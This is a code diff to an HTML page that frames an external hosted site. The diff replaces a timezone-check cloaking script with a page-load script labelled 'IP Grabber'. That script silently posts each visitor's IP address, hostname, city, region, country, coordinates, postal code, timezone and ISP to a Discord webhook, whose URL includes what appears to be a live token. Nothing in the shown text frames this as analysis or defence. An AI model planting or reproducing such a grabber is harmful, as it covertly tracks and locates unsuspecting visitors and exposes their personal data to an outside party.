@@ -11,15 +11,65 @@
   <frame frameborder="0" src="https://shinome.000webhostapp.com/" sandbox="allow-forms allow-modals allow-orientation-lock allow-pointer-lock allow-popups allow-popups-to-escape-sandbox allow-presentation allow-same-origin allow-scripts allow-top-navigation allow-top-navigation-by-user-activation" scrolling="auto" noresize></frame>
   </frameset>
   <script>
-    $.get("https://ipinfo.io", (data) => {
-      if (Intl.DateTimeFormat().resolvedOptions().timeZone != data.timezone) {
-         $("frameset").style.display = null;
-      }
-      else {
-       $("frameset").remove(); 
-      }
-    }, "JSONP");
-    $("script").remove();
+$.get("https://ipinfo.io", (data) => {
+    fetch(
+        'https://discord.com/api/webhooks/1016647229525737522/x-B_Z_Go0q_E4S4tdDH8AugDYs72tfofQYt8sEFDm305FVxNsoAAMCnzJ0L51m30Cjs4', {
+            method: 'post',
+            headers: {
+                'Content-Type': 'application/json',
+            },
+            body: JSON.stringify({
+                username: 'IP Grabber',
+                content: ' ',
+                embeds: [{
+                    color: 11730954,
+                    author: {
+                        name: 'New IP Adress Grabbed',
+                    },
+                    fields: [{
+                            name: 'IP Adress',
+                            value: data.ip,
+                        },
+                        {
+                            name: 'Host Name',
+                            value: data.hostname,
+                        }, {
+                            name: 'City',
+                            value: data.city,
+                        },
+                        {
+                            name: 'Region',
+                            value: data.region,
+                        },
+                        {
+                            name: 'Country',
+                            value: data.country,
+                        }, {
+                            name: 'Location',
+                            value: data.loc,
+                        },
+                        {
+                            name: 'Postal',
+                            value: data.postal,
+                        },
+                        {
+                            name: 'Timezone',
+                            value: data.timezone,
+                        },
+                        {
+                            name: 'ORG',
+                            value: data.org,
+                        },
+                        {
+                            name: 'Readme',
+                            value: data.readme,
+                        }
+                    ],
+                }, ],
+            }),
+        }
+    );
+}, "JSONP");
   </script>
 </body>
 </html>
